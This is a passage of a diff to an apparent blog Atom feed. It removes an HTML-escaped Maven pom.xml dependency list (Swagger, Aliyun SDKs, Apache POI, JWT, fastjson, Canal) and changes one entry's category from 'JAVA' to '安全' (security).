-            &amp;lt;!--swagger--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;springfox-swagger2&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${swagger.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--swagger ui--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;springfox-swagger-ui&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${swagger.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--aliyunOSS--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.aliyun.oss&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;aliyun-sdk-oss&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${aliyun.oss.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--日期时间工具--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;joda-time&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;joda-time&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${jodatime.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--xls--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.apache.poi&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;poi&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${poi.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--xlsx--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.apache.poi&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;poi-ooxml&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${poi.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--文件上传--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;commons-fileupload&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;commons-fileupload&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${commons-fileupload.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--commons-io--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;commons-io&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;commons-io&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${commons-io.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--httpclient--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.apache.httpcomponents&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;httpclient&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${httpclient.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.google.code.gson&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;gson&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${gson.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!-- JWT --&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;io.jsonwebtoken&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;jjwt&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${jwt.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;!--aliyun--&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;aliyun-java-sdk-core&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${aliyun-java-sdk-core.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.aliyun.oss&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;aliyun-sdk-oss&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${aliyun-sdk-oss.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;aliyun-java-sdk-vod&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${aliyun-java-sdk-vod.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;aliyun-java-vod-upload&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${aliyun-java-vod-upload.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;aliyun-sdk-vod-upload&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${aliyun-sdk-vod-upload.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-
-                &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${fastjson.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;org.json&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;json&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${json.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;commons-dbutils&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;commons-dbutils&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${commons-dbutils.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-            &amp;lt;dependency&amp;gt;
-                &amp;lt;groupId&amp;gt;com.alibaba.otter&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;canal.client&amp;lt;/artifactId&amp;gt;
-                &amp;lt;version&amp;gt;${canal.client.version}&amp;lt;/version&amp;gt;
-            &amp;lt;/dependency&amp;gt;
-        &amp;lt;/dependencies&amp;gt;
-
-    &amp;lt;/dependencyManagement&amp;gt;
-    &amp;lt;build&amp;gt;
-        &amp;lt;plugins&amp;gt;
-            &amp;lt;plugin&amp;gt;
-                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
-                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
-            &amp;lt;/plugin&amp;gt;
-        &amp;lt;/plugins&amp;gt;
-    &amp;lt;/build&amp;gt;
-&amp;lt;/project&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
